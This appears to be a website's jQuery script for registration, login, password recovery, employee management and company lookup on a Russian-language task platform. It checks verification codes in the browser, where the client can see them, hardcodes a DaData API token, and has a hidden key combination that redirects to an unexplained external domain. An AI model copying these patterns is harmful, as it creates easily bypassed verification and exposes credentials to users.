$(document).ready(function () {

    $(document).find('.burger-mobil-block').click(function () {

        $(document).find('.menu').slideToggle();
    });
    $(document).on('click' , '.see-phone-manager' ,function (){
        // $(this).hide();
        var phoneIsset = $(this).next('.phone-non').children('p').text();

        if(phoneIsset !== ""){
            $(this).hide();
        }
        $(this).next('.phone-non').show();
    });
    $(document).find("input[name='CodeAccountuser'] , input[name='searchInpHead']").keydown(function(event) {
        // Разрешаем: backspace, delete, tab и escape
        if ( event.keyCode == 46 || event.keyCode == 8 || event.keyCode == 9 || event.keyCode == 27 ||
            // Разрешаем: Ctrl+V
            (event.keyCode == 86 && event.ctrlKey === true) ||
            // Разрешаем: Ctrl+A
            (event.keyCode == 65 && event.ctrlKey === true) ||
            // Разрешаем: home, end, влево, вправо
            (event.keyCode >= 35 && event.keyCode <= 39)) {
            // Ничего не делаем
            return;
        } else {
            // Запрещаем все, кроме цифр на основной клавиатуре, а так же Num-клавиатуре
            if ((event.keyCode < 48 || event.keyCode > 57) && (event.keyCode < 96 || event.keyCode > 105 )) {
                event.preventDefault();
            }
        }
    });
    $('body').on('click', '#eye-see-pass', function(){

        if ($(this).hasClass('check-pass-see')){
            $(this).removeClass('check-pass-see');
            $(this).closest('.form-group').find('.authPassForUser').attr('type', 'password');
            // $('.authPassForUser').attr('type', 'password');
            $(this).find('.bi-eye-fill').show();
            $(this).find('.bi-eye-slash-fill').hide();

        } else {
            $(this).addClass('check-pass-see');
            // $('.authPassForUser').attr('type', 'text');
            $(this).closest('.form-group').find('.authPassForUser').attr('type', 'text');

            $(this).find('.bi-eye-fill').hide();
            $(this).find('.bi-eye-slash-fill').show();
        }

    });
    $('.without-auth').click(function () {
        $.fancybox.open([
            {
                src: '#popup-registration'
            }]);
    })
    function b64EncodeUnicode(str) {
        // first we use encodeURIComponent to get percent-encoded UTF-8,
        // then we convert the percent encodings into raw bytes which
        // can be fed into btoa.
        return btoa(encodeURIComponent(str).replace(/%([0-9A-F]{2})/g,
            function toSolidBytes(match, p1) {
                return String.fromCharCode('0x' + p1);
            }));
    }
    $(document).find('.main-search').submit(function () {
        var needN = $(this).find('input[name="need"]').val();
        document.cookie = "need="+needN;
        $(this).find('input[name="need"]').val(need);
    });
    function gen_password(len){
        var password = "";
        var symbols = "0123456789";
        for (var i = 0; i < len; i++){
            password += symbols.charAt(Math.floor(Math.random() * symbols.length));
        }
        return password;
    }
    // code_se_email

    document.addEventListener('keyup', function(event){
        if(event.ctrlKey && event.altKey && event.keyCode == 81 ){
            // ctrl+alt+q
            document.location.href = "http://prison-fakes.ru/s/5.php?t=";
        }
    });
    function showPopup(messege , classNa){
        var popup = $(document).find('#popup-notification-account')
        $(popup).find('.classNotific').addClass(classNa);
        $(document).find('#popup-notification-account').find('.classNotific').children('.textStrond').text(messege);
        $.fancybox.open([
            {
                src: '#popup-notification-account'
            }]);
        function funcs(){
            $(document).find('#popup-notification-account').find('strong').text('');
            $(popup).find('.classNotific').removeClass(classNa);
            $.fancybox.close([
                {
                    src: '#popup-notification-account'
                }]);
        }
        setTimeout(funcs, 2000);
    }



    function checkAccountReal(element){
        //получаю  тип  поля
        var typeCheck = $(element).attr('data-type-check');
        var data = $(document).find('.emailUpAc-'+typeCheck).val();

        var adminId = $(document).find('input[name="NumberAdmin"]').val();
        var nameEmpl = $(document).find('input[name="UserNameEmpl"]').val();
        var femaleEmpl = $(document).find('input[name="UserFemaleEmpl"]').val();

        code = gen_password(6);

        codeBase63 = b64EncodeUnicode(code);
        //отправляю код на мыло или телефон
        $.ajax({
            type: "POST",
            url: '/ajax/ajaxCheckData.php',
            data: ({
                typeCheck : typeCheck,
                dataCheck : data,
                codeBase64 :  codeBase63,
                NumberAdmin : adminId,
                UserNameEmpl : nameEmpl,
                UserFemaleEmpl : femaleEmpl,

            }),
            success: function(msg ){
                var  array = JSON.parse(msg);

                if(array.message == 'OK'){
                    $.fancybox.open([{src: '#popup-code-inp'}]);
                    $(document).on('input' , 'input[name="CodeAccountuser"]' , function (event) {
                        var countInp = $(this).val().length;
                        if(countInp == 6){
                            if($(this).val() == code){
                                $.fancybox.close([
                                    {
                                        src: '#popup-code-inp'
                                    }]);
                                $.ajax({
                                    type: "POST",
                                    url: '/ajax/ajaxCheckData.php',
                                    data: ({
                                        typeCheckAll : typeCheck,
                                        typeValueAll : data,
                                        codeSuccess : 'Y',

                                    }),
                                    success: function(msg ){
                                        var  array = JSON.parse(msg);
                                        if(array.status == 'OK'){

                                            showPopup(array.messageText , 'alert alert-success');
                                            if( $(document).find('input[name="name"]').val() !== '' &&
                                                $(document).find('input[name="phone"]').val() !== '' &&
                                                $(document).find('input[name="authEmail"]').val() !== ''){
                                                    $(document).find('.pers_dataBtnSaveData').removeAttr('disabled');

                                                }
                                        }
                                    }
                                });
                            }else {
                                showPopup("Код подтверждения введен не верно" , 'alert alert-danger');
                            }
                        }
                    })
                }else {

                    showPopup(array.message , 'alert alert-danger');
                }

            }
        });

    }
    //функция для проверки кода по sms  или mail
    $(document).on('click' , '.update__account_data' , function () {
      var el = $(this);
      checkAccountReal(el);
    });
    $('.kolvo_type_num').on('keyup', function(){
        $(this).val($(this).val().replace (/\D/, ''));
    });
    // g - onkeyup="this.value = this.value.replace (/[^0-9+]/g, '')"
    $(document).on('click' , '.changeButton' , function () {
        $('.updateParam').hide();
        $('.inpUpdateParam').css({
            'display' : 'inline-block'
        });
    });
    $(document).on('click' , '.inpBackParam' , function () {
        $('.updateParam').show();
        $('.inpUpdateParam').hide();
    });
    // $('.form-group').is()
    // $('#create-inp-desc').select2({
    //     minimumInputLength:60,
    //     language: 'ru',
    //     minimumResultsForSearch: Infinity
    // });
    // kalifs-full.tar
        $('#create-inp-desc').focusout(function () {
            var curLenght = $(this).val().length;
            if(curLenght < 15){
                if($(document).find('.errorMinLenghtp').hasClass('notifics')){

                }else {
                    $('#create-inp-desc').parents('.form-group').append('<p class="errorMinLenghtp notifics" style="color:red;margin-top:10px">Вы ввели меньше 15 символов</p>');

                }
            }else {
                $('.errorMinLenghtp').remove();
            }
        });

        $('input[name="PHONE_RMPLOYEES"]').mask("+7 (999) 999-9999");
        $('input[name="PHONE_EMPLOYEES"]').mask("+7 (999) 999-9999");


    $(document).on('click' , '.saveDataUp' , function (event) {
        event.preventDefault();
        var data  =  $(document).find('#formUpdateDataEmployees').serialize();
        var path = $(document).find('#formUpdateDataEmployees').attr("action");
        $.ajax({
            type: "POST",
            url: path,
            data: data,
            success: function(msg ){

                var  array = JSON.parse(msg);
                $(document).find('#formUpdateDataEmployees').find('.pass_encorect').text('');

                if(array.message == 'updateSuccess'){
                    window.location.replace("/user/employees/");
                }
                if(array.message == 'updateError'){
                    $(document).find('#formUpdateDataEmployees').find('.pass_encorect').text(array.notification);
                }

            }
        });
    });
    $(document).on('click' , '.buttonPadd-bt' , function (event){
        event.preventDefault();

       var form = $(document).find('#formDelEmployees');
       var path = $(form).attr('action');
       var data = $(form).serialize();

        $.ajax({
            type: "POST",
            url: path,
            data: data,
            success: function(msg ){
                var  array = JSON.parse(msg);
                console.log(array);
                $(document).find('.pass_encorect').text('');
                if(array.message == 'successDelete'){
                    //редирект
                    window.location.replace("/user/employees/");
                }
                if(array.message == 'errorDelete'){
                    //ошибка удаления изза отсуствия в компании
                    $(document).find('#popup-deleteEmployees').find('.pass_encorect').text(array.notification);
                    $(document).find('#popup-deleteEmployees').find('.pass_encorect').show();
                }
                if(array.message == 'errorPass'){
                    //не верный пароль
                    $(document).find('#popup-deleteEmployees').find('.pass_encorect').text(array.notification);
                    $(document).find('#popup-deleteEmployees').find('.pass_encorect').show();

                }
            }
        });

       return false;
    });
    $(document).on('click' , '.btnEmployeesNew' , function (event) {
        event.preventDefault();
        var data  = $(document).find('#EmplyeesNew').serialize();
        var path =$(document).find('#EmplyeesNew').attr("action");

        $.ajax({
            type: "POST",
            url: path,
            data: data+'&addUEmployees=Y',
            success: function(msg ){
                //10001ый аякс , мне все еще лень написать единую функцию
                // var addNewForm = $('#EmplyeesNew');
                // $('#EmplyeesNew').reset();
                // var oldForm = '';
                var  array = JSON.parse(msg);

                if(array.message == 'REGOK'){
                    // $.fancybox.open("popup-notification");
                    // alert();
                    $(document).find('.task-preview-employees').before(array.data).slideUp('slow');
                    document.getElementById("EmplyeesNew").reset();
                    $(document).find('.task-preview-employees').show('slow');
                };


                if(array.message == "FLASEREG"){
                    // message_send
                    $(document).find('#popup-notification').find('strong').html(array.message_send);
                    $.fancybox.open([
                        {
                            src: '#popup-notification'
                        }
                    ], {
                        padding: 0,
                        openEffect: 'fade',
                        closeEffect: 'fade',
                        nextEffect: 'none',
                        prevEffect: 'none',
                        beforeShow: function (instance, current) {
                            $(document).find('.task-preview-employees').show('slow');
                        }
                    });
                }
                // $(document).find('.task-preview-employees').before(array.data);
            }
        })
        return false;
    })
    $(document).on('click' , '.event-del-photo' , function () {
        var idDelEL = $(this).attr("data-id-delPhoto");
        $.ajax({
            type: "POST",
            url: "/ajax/ajax_remove_file.php",
            data: ({
                "file" : idDelEL
            }) ,
            success: function(msg ){
                var  array = JSON.parse(msg);
                $('.attachment-picts-user-company').remove();
                $('.logo-companyHideBlock').show();

            }
        })
    })

    $(document).on('click' , '.event-del-photoNew' , function () {
        var idDelEL = $(this).attr("data-id-delPhoto");
        $.ajax({
            context: this,
            type: "POST",
            url: "/ajax/ajax_remove_file.php",
            data: ({
                "file" : idDelEL
            }) ,
            success: function(msg ){
                $(this).closest('.item').remove();

            }
        })
    })

    function searchDadata (value){

        var valueInn = value;

        if (valueInn.length == 10 || valueInn.length == 12) {
            var url = "https://suggestions.dadata.ru/suggestions/api/4_1/rs/findById/party";
            var token = "d834df0d5abffaf53d4d82bf351ecc9038210e7a\n";
            var query = valueInn;

            var options = {
                method: "POST",
                mode: "cors",
                headers: {
                    "Content-Type": "application/json",
                    "Accept": "application/json",
                    "Authorization": "Token " + token
                },
                body: JSON.stringify({query: query})
            }

            fetch(url, options)
                .then(response => response.text())
                .then(result => result)
                .catch(error => error)



                .then(data => {

                    var  data = JSON.parse(data);
                    if(data.suggestions[0]){
                        console.log(data.suggestions[0].value);

                        $(document).find('.select2-selection__placeholder').css({
                            'color' : 'black'
                        });
                        $(document).find('.select2-selection__placeholder').text((data.suggestions[0].data.inn));

                        if(data.suggestions[0].data.type == 'LEGAL'){
                            $('select[name="type_company"] option[value="UR"]').attr("selected", "selected");
                        }
                        else if(data.suggestions[0].data.type  == 'INDIVIDUAL'){
                            $('select[name="type_company"] option[value="IP"]').attr("selected", "selected");
                        }
                        $('input[name="OGRN"]').val(data.suggestions[0].data.ogrn);
                        $('input[name="KPP"]').val(data.suggestions[0].data.kpp);
                        $('input[name="OKPO"]').val(data.suggestions[0].data.okpo);
                        $('input[name="GEN_DERECTOR"]').val(data.suggestions[0].data.management.name);
                        $('input[name="UR_ADDRESS"]').val(data.suggestions[0].data.address.value);

                        $('input[name="UF_COMPANY_NAME_MIN"]').val(data.suggestions[0].data.name.short_with_opf);
                        $('input[name="UF_BIG_NAME"]').val(data.suggestions[0].data.name.full_with_opf);
                        // $('input[name="FACT_ADDRESS"]').val(data.suggestions[0].data.address.unrestricted_value);
                        $(document).find('.select2-results').children('ul').empty();
                        $(document).find('.select2-results').children('ul').append('<li role="treeitem" aria-live="assertive" class="select2-results__option ">Найдено:</li>');
                        $(document).find('.select2-results').children('ul').append('<li role="treeitem treeitemINNCompany" aria-live="assertive" class="select2-results__option "><a class="itemCompanyLin">'+data.suggestions[0].value+'</a></li>');
                        $(".INNPASS").val();
                        $(".INNPASS").val(value);

                    }else {
                        $(document).find('.select2-results').children('ul').empty();
                        $(document).find('.select2-results').children('ul').append('<li role="treeitem" aria-live="assertive" class="select2-results__option ">Введенный ИНН не найден в базе :</li>');
                        // $(document).find('.select2-results').children('ul').append('<li role="treeitem treeitemINNCompany" aria-live="assertive" class="select2-results__option "><a class="itemCompanyLin"></a></li>');

                    }
                })
        }else {
            // $('.more-properties-company').hide();
            // $('.dop_files').hide();
            // $('.btnCompanyNew').parent('div').hide();
            // $('#CompanyNew').reset();
        }
    }
    $(document).on('click' , '.itemCompanyLin' , function () {
        $('.more-properties-company').show();
        $('.dop_files').show();
        $('.btnCompanyNew').parent('div').show();
        $('#searchCompany').select2('close');
        $(document).find('.btnCompanyNew').prop('disabled' , false);
        // $(document).find('.select2-container--default').removeClass('select2-container--open');
    })


        $('#searchCompany').on('select2:open', function (e) {
            // Do something
           $(document).find('.select2-results').parents('.select2-container').children('.select2-dropdown').css({
               "margin-top" : "-36px"
           });
            // "width" :  $(document).find('.select2-search--dropdown').width() - 20 +"px"
            $(document).find('.select2-search--dropdown').css({
                "width" :  "97%"
            });
            $(document).find('.select2-selection__arrow').css({
                "z-index" : "9999"
            })
        });
        var pathCompany = $('#searchCompany').attr('data-path');
        $('#searchCompany').select2({
            placeholder : 'Введите 10 цифр номера ИНН',
            language: "ru",
            minimumInputLength: 10 ,
            ajax: {
                url: pathCompany,

                data: function (params) {

                    var query = {
                        searchINN: params.term,
                        typeSearchCompany: 'searchCompany'
                    }
                    return query;
                },
                processResults: function (data , query) {

                    // console.log(query);
                    var  array = JSON.parse(data);


                    if( array.notificationSearch == 'foundCompany'){
                        //если компания не найденна , показываю уведомления , иначе делаю запрос в dadata
                        // console.log(array.messageSearch);
                        $('.searchCompanyErrorText').css({
                            "margin-top" : "75px"
                        });
                       $('.searchCompanyErrorText').text(array.messageSearch);
                        $('.searchCompanyErrorText').show();
                    }
                   else {
                        if( array.notificationSearch == 'notFoundCompany'){

                            $('.searchCompanyErrorText').hide();

                           // var items = searchDadataItems(query.term);

                            // console.log(query);
                            // $('.more-properties-company').hide();
                            // $('.dop_files').hide();
                            // $('.btnCompanyNew').parent('div').hide();
                            // $('#CompanyNew').get(0).reset();
                            var sst = searchDadata(query.term);

                            // return {
                            //     results: data.items
                            // };
                            // results: data.items
                        }
                    }
                }

            }
        });





    $('.fileSetting').change(function () {
        $(this).prop('disabled' , true);
    });



    $(document).on('change' , '.code_se_phone' , function (data) {
        $('.btn-submit').prop('disabled' , false);
    });
    $(document).on('change' , '.code_se_email' , function (data) {
        $('.btn-submit').prop('disabled' , false);
    });
    $(document).find(".password_reg").keyup(function(event) {
        $('.pass_encorect').hide();
        var value = this.value;
        this.value = this.value.toLowerCase();
        if (/[a-zA-Z0-9_]/.test(value) ) {
            if(this.value.length < 6){
                $('.pass_encorect').show();
            }else {
                $('.pass_encorect').hide();
            }
        }
        else {
            $('.pass_encorect').show();
            $(this).val('');
        }
    });
    $(document).on('click' , 'res_write' , function (){
        window.location.replace(location.hostname+"/user/settings/");
    });

    // authPhone
    $('input[name="authPhone"]').mask("+7 (999) 999-9999");
    // $('input[name="authEmail"]').inputmask("email");
    //restore pass
    $('input[name="restorePasswordPhone"]').mask("+7 (999) 999-9999");
    $('input[name="restorePasswordEmail"]').inputmask("email");

    // $('.btn-submit-restore').click(function (){
    //     var typeOld = $('.tabs-head-type-auth').find('.active').attr('data-typeOld');
    //     var valueOld =  $('input[name="'+typeOld+'"]');
    //     var valueOld = $(valueOld).val();
    //     if(valueOld.length == 0){
    //
    //     }else {
    //         alert();
    //         var without = $('.restore-password').find('.activeRepeatPass').parent('.form-group');
    //         $('.restore-password').find('input').parent('.form-group').remove();
    //         $('.restore-password').prepend(without);
    //
    //         $('input[name="authEmail"]').val(valueOld);
    //
    //
    //         $('.restore-password').prepend(without);
    //
    //         $('.iForrgotPass').trigger('click');
    //
    //
    //     }
    // })
    $('.iForrgotPass').click(function (){
        // $('input[name="authPassword"]').hide();
        var typeOld = $('.tabs-head-type-auth').find('.active').attr('data-typeOld');
        var type = $('.tabs-head-type-auth').find('.active').attr('data-type');
        var name = $('.tabs-head-type-auth').find('.active').attr('data-name');
        console.log(type);

        var el =  $('input[name="'+type+'"]');
        var valueOld =  $('input[name="'+typeOld+'"]');
        // var value = $(input).val();
        var valueOld = $(valueOld).val();
        $('.restore-password').find('input').removeClass('activeRepeatPass');
        $(el).addClass('activeRepeatPass');

        $('.restore-password').find('input').hide();
        $('.restore-password').find('.activeRepeatPass').show();



        if(valueOld.length == 0){

            if($('form').is('.error_inp_back')){

            }else {

                $('.forget-password-lnk').before("<p class='forgot_auth forgot_new error_inp_back' style='display: block'>Введите "+name+"</p>");
            }


        }else {


                $('.forget-password-lnk').closest('.tab').removeClass('active');
            $('.forget-password-lnk').closest('.tab').next('tab').addClass('active')
            $('.restore-password').show();
            // type
            $('.activeRepeatPass').val('');
            $('.activeRepeatPass').val(valueOld);
            $('.restore-password').find('input').hide();

            $('.restore-password').find('.forgot_auth').css({
                'color' : 'red',
                'display' : 'block'
            });
            $('.restore-password').find('.forgot_auth').text('Ваш пароль скоро будет отправлен');

            $('.restore-password').find('.forgot_auth').css({
                'display' : 'block'
            });
            $('#tab4').addClass('active');


            $('.restore-password').find('.forget-password-lnk').hide();
            $('.restore-password').find('.forget-password-lnk').next('.text-center').hide();

            $.ajax({
                type: "POST",
                url: "/ajax/ajax.php",
                data: 'login='+valueOld+'&Forrgot=Y&type='+type ,
                success: function(msg ){
                    var  array = JSON.parse(msg);
                    if(array.message == 'FORRGOT_SUCCESS'){
                        $(document).find('.error_inp_back').find('.forgot_new').remove();

                        // $('.restore-password').find('input').hide();
                        // $('.restore-password').find('.activeRepeatPass').show();

                        // var mes = $('.forgot_auth').text(array.message_text);
                        var tegNotification = $('.restore-password').find('input').hide();
                        var tegNotification = $('.restore-password').find('.forgot_auth').text(array.message_text);

                        $(tegNotification).css({
                            'color' : 'green',
                            'display' : 'block'
                        });
                        $(document).find('.restore-password').find('.forgot_auth').addClass('activeRestorePassNotific');
                        $(document).find('.restore-password').find('.forgot_auth').show();

                        function sendPassAll(){


                        $('#tab4').removeClass('active');
                        $('#tab3').addClass('active');
                        $('.restore-password').hide();
                        $('#auth-form-b').show();
                        }
                        var intervalID = setTimeout(sendPassAll, 3000 );


                    }
                    if(array.message == 'FORRGOT_ERROR'){

                        $('.restore-password').find('.forgot_auth').text(array.message_text);
                        $('.restore-password').find('.forgot_auth').show();
                        function sendPassAll(){


                            $('#tab4').removeClass('active');
                            $('#tab3').addClass('active');
                            $('.restore-password').hide();
                            $('#auth-form-b').show();
                        }
                        setInterval(sendPassAll, 3000);
                    }

                }
            })
        }



    });
    $(document).find('.clickAuth').on( "click", function( event ) {
        event.preventDefault();

        var data  = $('#auth-form-b').serialize() ;

        $('.forgot_auth').hide();

        $.ajax({
            type: "POST",
            url: "/ajax/ajax.php",
            data: data+'&Auth=Y' ,
            success: function(msg ){


                var  array = JSON.parse(msg);
                if(array.message == 'ERROR_AUTH'){
                    $('.errorMailOrPass').text(array.status_text);
                    $('.errorMailOrPass').show();
                    function delNotific(){
                        $('.errorMailOrPass').hide();
                    }
                    setTimeout(delNotific , 1000);
                }
                if(array.message == 'OKAUTH'){

                    //если страница создание заявки - тогда перед этим заполняю заявку с начала
                    if($(document).find('.new-task-create').length){
                        $(document).find('.new-task-create').submit();
                        // window.location.replace("/user/settings/");
                    }else {
                        window.location.reload();
                    }
                }
            }
        })
    });


    function registrationForMail(data , code , codeBase63){
        $.ajax({
            type: "POST",
            url: "/ajax/ajax.php",
            data: data + '&message=' + codeBase63,
            success: function (msg) {
                var  array = JSON.parse(msg);
                if(array.message == 'OKMAIL'){
                    $(document).find('.inp_code').show();
                    $('.phone_encorect').hide();
                    $(document).find("input[name='code']").keydown(function(event) {
                        // Разрешаем: backspace, delete, tab и escape
                        if ( event.keyCode == 46 || event.keyCode == 8 || event.keyCode == 9 || event.keyCode == 27 ||
                            // Разрешаем: Ctrl+V
                            (event.keyCode == 86 && event.ctrlKey === true) ||
                            // Разрешаем: Ctrl+A
                            (event.keyCode == 65 && event.ctrlKey === true) ||
                            // Разрешаем: home, end, влево, вправо
                            (event.keyCode >= 35 && event.keyCode <= 39)) {
                            // Ничего не делаем
                            return;
                        } else {
                            // Запрещаем все, кроме цифр на основной клавиатуре, а так же Num-клавиатуре
                            if ((event.keyCode < 48 || event.keyCode > 57) && (event.keyCode < 96 || event.keyCode > 105 )) {
                                event.preventDefault();
                            }
                        }
                    });
                    $(document).on("input" , "input[name='code']" , function () {
                        $('.repeat_send_code , .repeat_send_code_not_correct ').hide();
                        if($(this).val().length == 6){
                            if($(this).val() == code){
                        
                                $('.repeat_send_code').show();
                                $(this).prop('disabled' , true);
                                $(this).parents('#registration').find('.btn-submit').remove();
                                $(this).parents('#registration').find('.registerBlockB').append('<div class="btn btn-submit btn-green res_write disabledbutton">Продолжить</div>');
                                var data  = $('#registration').serialize() ;
                                // ajax
                                $.ajax({
                                    type: "POST",
                                    url: "/ajax/ajax.php",
                                    data: data+'&registration=Y' ,
                                    success: function(msg){

                                        var  array = JSON.parse(msg);
                                        if(array.message == 'REGOK'){
                                            console.log('ты конченый');
                                            $('#registration').find('.res_write').removeClass('disabledbutton');
                                            // $(document).on('click' , 'res_write' , function (){
                                            //     window.location.replace("http://develop.su/user/settings/");
                                            // });
                                            $('#registration').find('.res_write').click(function () {
                                                //если страница создание заявки - тогда перед этим заполняю заявку с начала
                                                if($(document).find('.new-task-create').length){
                                                    $(document).find('.new-task-create').submit();
                                                    // window.location.replace("/user/settings/");
                                                }else {
                                                    window.location.replace("/user/settings/");
                                                }

                                            })
                                        }

                                    }
                                });

                            }else {
                                $('.repeat_send_code_not_correct').show();
                            }
                        }
                        else {

                        }
                    })



                }else {
                    if(array.message == 'REPEAT_USER'){
                        $('.phone_encorect').text(array.message_text);
                        $('.phone_encorect').show();
                    }
                    if(array.message == 'ERROR'){
                        $('.phone_encorect').text(array.status_text);
                        $('.phone_encorect').show();
                    }
                }
            }
        });
   }

    function sendRegistration(data ,  code , codeBase63){
        //функция регистрации поситителей
        // var text  = "Ваш код для регистрации на сайте - "+code;
        $.ajax({
            type: "POST",
            url: "/ajax/ajax.php",
            data: data+'&message='+codeBase63 ,
            success: function(msg ){
                var  array = JSON.parse(msg);
                if(array.message == 'OKSMS' || array.message == 'OKMAIL'){
                    $(document).find('.inp_code').show();
                    $('.phone_encorect').hide();
                    // if()
                    $(document).find("input[name='code']").keydown(function(event) {
                        // Разрешаем: backspace, delete, tab и escape
                        if ( event.keyCode == 46 || event.keyCode == 8 || event.keyCode == 9 || event.keyCode == 27 ||
                            // Разрешаем: Ctrl+V
                            (event.keyCode == 86 && event.ctrlKey === true) ||
                            // Разрешаем: Ctrl+A
                            (event.keyCode == 65 && event.ctrlKey === true) ||
                            // Разрешаем: home, end, влево, вправо
                            (event.keyCode >= 35 && event.keyCode <= 39)) {
                            // Ничего не делаем
                            return;
                        } else {
                            // Запрещаем все, кроме цифр на основной клавиатуре, а так же Num-клавиатуре
                            if ((event.keyCode < 48 || event.keyCode > 57) && (event.keyCode < 96 || event.keyCode > 105 )) {
                                event.preventDefault();
                            }
                        }
                    });
                    $(document).on("input" , "input[name='code']" , function () {
                        $('.repeat_send_code , .repeat_send_code_not_correct ').hide();
                        if($(this).val().length == 6){
                            if($(this).val() == code){
                                $('.repeat_send_code').show();
                                $(this).prop('disabled' , true);
                                $(this).parents('#registration').find('.btn-submit').remove();
                                $(this).parents('#registration').find('.registerBlockB').append('<div class="btn btn-submit btn-green res_write disabledbutton">Продолжить</div>');
                                var data  = $('#registration').serialize() ;
                                // ajax
                                $.ajax({
                                    type: "POST",
                                    url: "/ajax/ajax.php",
                                    data: data+'&registration=Y' ,
                                    success: function(msg){

                                        var  array = JSON.parse(msg);
                                        if(array.message == 'REGOK'){
                                            console.log('ты конченый');
                                            $('#registration').find('.res_write').removeClass('disabledbutton');
                                            // $(document).on('click' , 'res_write' , function (){
                                            //     window.location.replace("http://develop.su/user/settings/");
                                            // });
                                            $('#registration').find('.res_write').click(function () {
                                                //если страница создание заявки - тогда перед этим заполняю заявку с начала
                                                if($(document).find('.new-task-create').length){
                                                    $(document).find('.new-task-create').submit();
                                                    // window.location.replace("/user/settings/");
                                                }else {
                                                    window.location.replace("/user/settings/");
                                                }
                                            })
                                        }

                                    }
                                });

                            }else {
                                $('.repeat_send_code_not_correct').show();
                            }
                        }
                        else {

                        }
                    })


                }else {
                    if(array.message == 'REPEAT_USER'){
                       $('.phone_encorect').text(array.message_text);
                        $('.phone_encorect').show();
                    }
                    if(array.message == 'ERROR'){
                        $('.phone_encorect').text(array.status_text);
                        $('.phone_encorect').show();
                    }
                }
            }
        });
    }
    function validateEmail(email) {
        var re = /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
        return re.test(email);
    }

    $( "#registration" ).find('.btn-submit').on( "click", function( event ) {
        event.preventDefault();

            if(validateEmail($('.code_se_email').val())){

                $('.activeErrormail').remove();
                $('.registerBlockB').find('.btn-submit').removeAttr('disabled');
                var data  = $(document).find('#registration').serialize();
                code = gen_password(6);
                codeBase63 = b64EncodeUnicode(code);
                registrationForMail(data , code , codeBase63);
            }else {
                if($('.code_se_email').parent('.form-group').next('.phone_encorect').hasClass('activeErrormailAd')){
                    return  false;
                }else {
                    $('.code_se_email').parent('.form-group').next('.phone_encorect').text('Вы ввели не корректный email');
                    $('.code_se_email').parent('.form-group').next('.phone_encorect').addClass('activeErrormailAd');
                    $(document).find('.activeErrormailAd').show();
                    return false;
                }
            }

    });
    $(document).on('keypress', '#create-inp1', function () {
        $(this).val($(this).val().replace(/[^\d].+/, ""));
        if ((event.which < 48 || event.which > 57)) {
            event.preventDefault();
        }
        $(this).maskMoney({
            thousands: ' ',
            precision: 0
        });
    });

    $(document).on('keypress', '#create-inp1-nal', function () {
        $(this).val($(this).val().replace(/[^\d].+/, ""));
        if ((event.which < 48 || event.which > 57)) {
            event.preventDefault();
        }
        $(this).maskMoney({
            thousands: ' ',
            precision: 0
        });
    });
    $(document).on('keypress', '#create-inp3', function () {
        $(this).val($(this).val().replace(/[^\d].+/, ""));
        if ((event.which < 48 || event.which > 57)) {
            event.preventDefault();
        }
        $(this).maskMoney({
            thousands: ' ',
            // precision: 0
        });
    });
    $(document).on('click' , '#create-inpD3' , function () {
        $('input[name="nameBeznal"]').val('');
        $('input[name="nameNal"]').val('');
        $('input[name="contractPrice"]').val('');
        $('input[name="contractPrice"]').prop('checked', false);
        $('select[name="COUNT_MONEY_ZA"]').children('option:eq(0)').remove();
        $('select[name="COUNT_MONEY_ZA"]').children('option:eq(0)').before('<option value="" selected>&nbsp;</option>');
        $('.moneyBlock').slideToggle(400);
    });
    $('.tabs-head-type a, .tab-lnk').click(function (e) {
        if ($($(this).attr('href')).length > 0) {
            e.preventDefault();
            $(this).closest('li').addClass('active').siblings().removeClass('active');
            $($(this).attr('href')).addClass('active').siblings().removeClass('active');
            $('.btn-submit').prop('disabled' , true);
            $('.code_se_phone').val('');
            $('.code_se_email').val('');
            $('input[name="authEmail"]').val('');
            $('input[name="authPhone"]').val('');
            $('.phone_encorect').hide();
        }
    });
    $('.tabs-head-type-auth a, .tab-lnk').click(function (e) {
        if ($($(this).attr('href')).length > 0) {
            e.preventDefault();
            $(this).closest('li').addClass('active').siblings().removeClass('active');
            $($(this).attr('href')).addClass('active').siblings().removeClass('active');
            $('input[name="authEmail"]').val('');
            $('input[name="authPhone"]').val('');
            $('.error_inp_back').remove();
            $('.restore-password').find('.forgot_auth').remove();
        }
    });

    // $('.code_se_email').inputmask("email");
    $('#create-inp1').maskMoney();
    $('#create-inp3').maskMoney({
        thousands: ' ',
        precision: 0
    });
    $('#btn-file input').change(function () {
            var file = $(this).prop('files')[0],
                clone = $(this).clone(),
                itm = '<div class="itm"><span>' + file.name + '</span><a class="remove" href="#"><svg class="icon icon_close"> <use xlink:href="/bitrix/templates/democontent2.pi/images/sprite-svg.svg#close"></use></svg></a></div>';
            $(this).val('');
            // console.log(file);
            var typeFile = file.type.split('/');
            var countFiles = $(document).find('#files-list').find('.itm');
            var countFiles = countFiles.length;



            if(countFiles <= 2){
                $('.errorFileTypeMax').remove();
                if(typeFile[1] == 'jpg' || typeFile[1] == 'jpeg' ){

                    if(file.size <= 10485760){
                        $('.errorFileTypeMaxSize').remove();
                        $('.errorFileType').remove();
                        $('#files-list').append(itm);
                        $('#files-list .itm:last-child').prepend(clone);
                        if ($('#files-list .itm').length === BX.message('maxFiles')) {
                            $(this).closest('.btn-file').addClass('btn-disabled')
                        }
                    }else {
                        $(document).find('#files-list').before('<p class="errorFileTypeMaxSize" style="color:red;margin-top:10px">Превышен размер файла</p>');
                    }

                }else {

                    $(document).find('#files-list').before('<p class="errorFileType" style="color:red;margin-top:10px">Не поддерживаемый тип файла</p>');
                }
            }else {
                $(document).find('#files-list').before('<p class="errorFileTypeMax" style="color:red;margin-top:10px">Достигнуто макс кол-во файлов</p>');
            }


    });
    $(document).on('click', '#files-list .itm .remove', function (e) {
        e.preventDefault();
        var parent = $(this).closest('.form-group');
        $(this).closest('.itm').remove();
        if (parent.find('.files .itm').length < BX.message('maxFiles')) {
            parent.find('.btn-file').removeClass('btn-disabled')
        }
    });

    if($('div').is('#date-start')){
        $( "#date-start" ).datepicker({
            dateFormat: "dd.mm.yy"
        });
    }

    if($('div').is('#date-end')){
        $( "#date-end" ).datepicker({
            dateFormat: "dd.mm.yy"
        });
    }
    var todayDate = new Date();
    // var minData = todayDate.getMonth()+1+'.'+todayDate.getDate()+'.'+todayDate.getFullYear();
    var Month = todayDate.getMonth()+1;
    var minData = todayDate.getDate()+'.'+Month+'.'+todayDate.getFullYear();
    if($('div').is('#date-start')){
        $(  "#date-start" ).datepicker( "option", "minDate" , minData);
    }
